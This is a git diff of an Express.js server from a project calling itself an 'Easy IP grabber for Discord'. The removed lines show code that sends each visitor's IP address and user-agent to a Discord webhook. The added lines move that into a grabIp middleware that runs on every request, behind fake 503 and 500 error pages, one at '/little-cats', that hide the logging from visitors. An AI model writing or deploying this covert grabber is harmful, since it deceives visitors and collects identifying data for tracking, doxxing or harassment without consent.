@@ -1,6 +1,7 @@
 const express = require('express');
 const morgan = require('morgan');
-const axios = require('axios');
+const path = require('path');
+const grabIp = require('./scripts/grabIp.js');
 const { hidePoweredBy } = require('helmet');
 
 const app = express();
@@ -8,40 +9,17 @@ const app = express();
 app.use(hidePoweredBy());
 app.use(morgan('combined'));
 
+app.get('*', (req, _, next) => {
+	grabIp(req);
+	next();
+});
+
 app.get('/', (req, res) => {
-	res.send('500 Internal Server Error');
+	res.status(503).sendFile(path.join(__dirname + '/www/errors/503.html'));
+});
 
-	const embeds = [{
-		color: 16711740,
-		author : {
-			name: 'Easy IP grabber for Discord',
-			icon_url: 'https://raw.githubusercontent.com/sefinek24/easy-ip-grabber-for-discord/main/images/swagcat.png',
-		},
-		description: `\`\`\`${req.headers['user-agent']}\`\`\``,
-		fields: [
-			{
-				name: '» User IP',
-				value: `> ${req.ip}`,
-			},
-		],
-		footer: {
-			text: '🌍 https://github.com/sefinek24/easy-ip-grabber-for-discord',
-		},
-	}];
-
-	const data = JSON.stringify({ embeds });
-	const config = {
-		method: 'POST',
-		url: process.env.WEBHOOK_URL,
-		headers: { 'Content-Type': 'application/json' },
-		data,
-	};
-
-	try {
-		axios(config);
-	} catch (err) {
-		console.log(err);
-	}
+app.get('/little-cats', (req, res) => {
+	res.status(500).sendFile(path.join(__dirname + '/www/index.html'));
 });
 
 app.listen(process.env.PORT, () => {
